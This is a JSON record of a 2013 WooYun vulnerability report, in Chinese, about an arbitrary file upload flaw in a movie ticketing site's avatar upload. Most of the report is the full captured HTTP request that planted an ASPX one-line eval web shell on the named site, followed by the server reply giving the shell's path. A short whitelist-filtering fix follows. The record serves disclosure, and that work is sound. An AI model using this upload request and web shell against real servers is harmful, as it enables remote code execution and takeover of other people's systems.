{"id": 60919, "wybug_id": "wooyun-2013-041381", "wybug_title": "嘎嘎电影主站任意文件上传可getshell", "wybug_corp": "大方影逸", "wybug_author": "loli", "wybug_date": "2013-10-29 17:54", "wybug_open_date": "2013-12-13 17:55", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-12-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： IGAGA 17家影城电影兑换卡A券可在深圳电影院任意兑换电影票。 详细说明：  准备用你们的电影兑换卡去看电影的，发现卡后面有验证码可以在官网查询。\n\n1.注册一个用户，头像上传处存在任意文件上传漏洞，通过抓包上传aspx脚本\nPOST /yrsfileupbyswf.axd?w=1280&h=1280&checkstr=%3Cscript%3Eparent.UpFail%28%27NoFile%27%29%3B%3C/script%3E HTTP/1.1Host: igaga.cnProxy-Connection: keep-aliveContent-Length: 485Origin: http://igaga.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.69 Safari/537.36Content-Type: multipart/form-data; boundary=----------Ij5Ij5ae0cH2Ij5IAccept: */*Referer: http://igaga.cn/UserHead.aspx?backAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=2zxpzt55feeciarwahr------------Ij5Ij5ae0cH2Ij5Ij5ei4gL6ae0ae0Content-Disposition: form-data; name=\"Filename\"111.jpg------------Ij5Ij5ae0cH2Ij5Ij5ei4gL6ae0ae0Content-Disposition: form-data; name=\"filedata\"; filename=\"111.aspx\"Content-Type: application/octet-stream<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"chop\"],\"unsafe\");%>------------Ij5Ij5ae0cH2Ij5Ij5ei4gL6ae0ae0Content-Disposition: form-data; name=\"Upload\"Submit Query------------Ij5Ij5ae0cH2Ij5Ij5ei4gL6ae0ae0--\n提交后返回包：\nHTTP/1.1 200 OKDate: Tue, 29 Oct 2013 07:56:37 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETX-AspNet-Version: 2.0.50727Cache-Control: no-cache, no-storePragma: no-cacheExpires: -1Content-Type: text/html; charset=utf-8Content-Length: 25/UPFiles/p43khjj444.aspx\n   漏洞证明：  \n\n   修复方案：  检查所有上传功能是否采用白名单模式进行过滤。（看电影去了）   版权声明：转载请注明来源 loli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}